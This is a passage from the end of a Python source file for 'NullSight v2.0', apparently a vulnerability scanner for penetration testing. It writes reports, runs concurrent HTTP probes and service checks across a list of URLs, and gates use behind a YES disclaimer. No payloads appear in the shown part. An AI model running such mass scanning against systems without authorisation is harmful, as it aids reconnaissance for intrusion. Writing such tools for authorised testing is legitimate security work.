        f.write(f"**Duration**: {stats.elapsed:.1f}s  \n")
        f.write(f"**HTTP Requests**: {stats.done:,}  \n")
        f.write(f"**HTTP Findings**: {stats.findings}  \n")
        f.write(f"**Service Findings**: {stats.sys_findings}  \n\n---\n\n")

        if all_http:
            f.write("## Module 1: HTTP Probe Findings\n\n")
            for i, finding in enumerate(all_http, 1):
                f.write(f"### [{i}] {finding.severity} — {finding.signature_name}\n\n")
                f.write("| Field | Value |\n|---|---|\n")
                f.write(f"| URL | `{finding.url}` |\n")
                f.write(f"| Label | {finding.label} |\n")
                f.write(f"| Method | {finding.method} |\n")
                f.write(f"| Status | {finding.status_code} |\n")
                f.write(f"| CVE | {finding.cve or '—'} |\n")
                f.write(f"| Tags | {', '.join(finding.tags)} |\n")
                f.write(f"| Description | {finding.description} |\n")
                f.write(f"| Entropy flag | {'⚠ YES' if finding.entropy_flag else 'no'} |\n\n")
                if finding.snippet:
                    snippet = finding.snippet[:300].replace('`', "'")
                    f.write(f"**Snippet**:\n```\n{snippet}\n```\n\n")
                f.write("---\n\n")

        if all_svc:
            f.write("## Module 2: Service Findings\n\n")
            for i, sf in enumerate(all_svc, 1):
                f.write(f"### [{i}] {sf.severity} — {sf.service} @ {sf.host}:{sf.port}\n\n")
                f.write("| Field | Value |\n|---|---|\n")
                f.write(f"| Host | `{sf.host}` |\n")
                f.write(f"| Port | {sf.port} |\n")
                f.write(f"| Service | {sf.service} |\n")
                f.write(f"| Tags | {', '.join(sf.tags)} |\n")
                f.write(f"| Description | {sf.description} |\n\n")
                if sf.banner:
                    banner_esc = sf.banner[:200].replace('`', "'")
                    f.write(f"**Banner**:\n```\n{banner_esc}\n```\n\n")
                f.write("---\n\n")

def print_summary(
    stats: Stats,
    findings: list,
    svc_findings: list,
    console: Console,
) -> None:
    sev_count: dict = {}
    cve_set:   set  = set()

    for f in findings:
        sev_count[f.severity] = sev_count.get(f.severity, 0) + 1
        if f.cve: cve_set.add(f.cve)

    svc_sev: dict = {}
    for sf in svc_findings:
        svc_sev[sf.severity] = svc_sev.get(sf.severity, 0) + 1

    t = Table(
        title="NullSight v2.0 — Scan Summary",
        style="bold", box=box.DOUBLE_EDGE)
    t.add_column("Metric", style="cyan", no_wrap=True)
    t.add_column("Value",  style="white")
    t.add_row("Elapsed",              f"{stats.elapsed:.1f}s")
    t.add_row("HTTP requests",        f"{stats.done:,}")
    t.add_row("HTTP findings",        f"[bold]{stats.findings}[/bold]")
    t.add_row("Service checks",       f"{stats.sys_checks:,}")
    t.add_row("Service findings",     f"[bold]{stats.sys_findings}[/bold]")
    t.add_row("Errors / Throttled",   f"{stats.errors} / {stats.throttled}")
    t.add_row("Avg RPS",              f"{stats.rps:.1f}")
    t.add_row("─" * 20,               "─" * 20)

    for sev, color in [("CRITICAL","bold red"),("HIGH","red"),("MEDIUM","yellow")]:
        cnt = sev_count.get(sev, 0) + svc_sev.get(sev, 0)
        if cnt:
            t.add_row(f"  {sev}", f"[{color}]{cnt}[/{color}]")

    if cve_set:
        t.add_row("CVEs detected", str(len(cve_set)))
        t.add_row("CVE list",      ", ".join(sorted(cve_set)[:10]))

    console.print()
    console.print(t)

# ─────────────────────────────────────────────────────────────────────────────
# URL / HOST LOADER
# ─────────────────────────────────────────────────────────────────────────────
def load_urls(path: str) -> list[str]:
    p = Path(path)
    if not p.exists():
        raise FileNotFoundError(f"URL file not found: {path}")
    urls = []
    for line in p.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if not line.startswith(("http://", "https://")):
            line = "https://" + line
        urls.append(line)
    return urls

def extract_hosts(urls: list[str]) -> list[str]:
    """Extract unique hostnames from URL list."""
    hosts = set()
    for url in urls:
        parsed = urlparse(url)
        host = parsed.hostname
        if host:
            hosts.add(host)
    return sorted(hosts)

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
async def run(console: Console) -> None:
    urls  = load_urls(CONFIG.url_file)
    hosts = extract_hosts(urls)
    total = len(urls) * len(PROBES)

    console.print(Panel(
        f"[bold cyan]NullSight v2.0 — Authorized Pentest Scanner[/bold cyan]\n\n"
        f"[bold]Module 1: HTTP Probe Scanner[/bold]\n"
        f"  Targets      : [yellow]{len(urls):,}[/yellow]\n"
        f"  Probes/target: [yellow]{len(PROBES)}[/yellow]\n"
        f"  Total probes : [yellow]{total:,}[/yellow]\n"
        f"  Signatures   : [yellow]{len(SIGNATURES)}[/yellow]"
        f"  [dim](CRITICAL/HIGH/1 MEDIUM — strict FP filter)[/dim]\n"
        f"  Workers      : [yellow]{CONFIG.concurrency}[/yellow]\n\n"
        f"[bold]Module 2: Service Scanner[/bold]"
        f"  {'[green]ENABLED[/green]' if CONFIG.sys_scan_enabled else '[dim]DISABLED[/dim]'}\n"
        f"  Hosts        : [yellow]{len(hosts)}[/yellow]\n"
        f"  Service checks: [yellow]{len(SERVICE_CHECKS)}[/yellow]\n"
        f"  Ports checked: [dim]{', '.join(str(c.port) for c in SERVICE_CHECKS[:10])}...[/dim]",
        title="[bold green]⚠  AUTHORIZED PENTEST ONLY  ⚠[/bold green]",
        border_style="green",
    ))

    out_dir = Path(CONFIG.output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    stats    = Stats(total=total)
    findings: list[Finding] = []
    svc_findings: list[ServiceFinding] = []

    # ── Module 1: HTTP ──────────────────────────────────────────
    console.print(f"\n[bold]Module 1: HTTP Probe Scan[/bold] — {total:,} requests\n")
    queue: asyncio.Queue = asyncio.Queue(maxsize=CONFIG.queue_maxsize)

    connector = aiohttp.TCPConnector(
        ssl=False,
        limit=CONFIG.concurrency + 100,
        limit_per_host=15,
        ttl_dns_cache=300,
        use_dns_cache=True,
        force_close=True,
        enable_cleanup_closed=True,
    )

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[cyan]{task.completed}/{task.total}"),
        TextColumn("[yellow]{task.fields[rps]:.0f} req/s"),
        TextColumn("[red]findings: {task.fields[findings]}"),
        TimeElapsedColumn(),
        console=console,
        refresh_per_second=8,
    ) as progress:
        task_id = progress.add_task("HTTP scanning…", total=total, rps=0.0, findings=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            workers = [
                asyncio.create_task(
                    worker(queue, session, stats, findings,
                           progress, task_id, console, out_dir))
                for _ in range(CONFIG.concurrency)
            ]
            await producer(queue, urls)
            await asyncio.gather(*workers)

    # ── Module 2: Service scan ──────────────────────────────────
    if CONFIG.sys_scan_enabled and hosts:
        svc_findings = await run_system_scan(hosts, stats, console, out_dir)

    # ── Reports ─────────────────────────────────────────────────
    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    jp = out_dir / f"report_{ts}.json"
    cp = out_dir / f"report_{ts}.csv"
    mp = out_dir / f"report_{ts}.md"

    save_json(findings, svc_findings, jp)
    save_csv(findings, cp)
    save_markdown(findings, svc_findings, stats, mp)
    print_summary(stats, findings, svc_findings, console)

    console.print(f"\n[bold green]Reports:[/bold green]")
    console.print(f"  JSON     → [cyan]{jp}[/cyan]")
    console.print(f"  CSV      → [cyan]{cp}[/cyan]")
    console.print(f"  Markdown → [cyan]{mp}[/cyan]")
    console.print(f"  Files    → [cyan]{out_dir}/[/cyan]\n")

# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────
def main() -> None:
    import argparse
    console = Console()

    console.print(Panel(DISCLAIMER, border_style="yellow"))
    answer = input(">>> ").strip().upper()
    if answer != "YES":
        console.print("[red]Declined. Exiting.[/red]")
        sys.exit(0)

    p = argparse.ArgumentParser(description="NullSight v2.0 Pentest Scanner")
    p.add_argument("-c",  "--concurrency",     type=int,   default=100)
    p.add_argument("-t",  "--timeout",         type=int,   default=20)
    p.add_argument("--connect-timeout",        type=int,   default=8)
    p.add_argument("--read-timeout",           type=int,   default=14)
    p.add_argument("-q",  "--queue-size",      type=int,   default=5000)
    p.add_argument("-u",  "--url-file",        default="url.txt")
    p.add_argument("-o",  "--output-dir",      default="NullSight_findings")
    p.add_argument("-b",  "--body-limit",      type=int,   default=65536)
    p.add_argument("--delay",                  type=float, default=0.0)
    p.add_argument("--no-sysscan",             action="store_true",
                   help="Disable Module 2 service scan")
    p.add_argument("--sysscan-timeout",        type=int,   default=5)
    args = p.parse_args()

    CONFIG.concurrency      = args.concurrency
    CONFIG.timeout          = args.timeout
    CONFIG.connect_timeout  = args.connect_timeout
    CONFIG.read_timeout     = args.read_timeout
    CONFIG.queue_maxsize    = args.queue_size
    CONFIG.url_file         = args.url_file
    CONFIG.output_dir       = args.output_dir
    CONFIG.max_body_bytes   = args.body_limit
    CONFIG.delay_max        = args.delay
    CONFIG.sys_scan_enabled = not args.no_sysscan
    CONFIG.sys_scan_timeout = args.sysscan_timeout

    try:
        asyncio.run(run(console))
    except FileNotFoundError as e:
        console.print(f"[bold red]Error:[/bold red] {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted.[/yellow]")
        sys.exit(0)

if __name__ == "__main__":
    main()
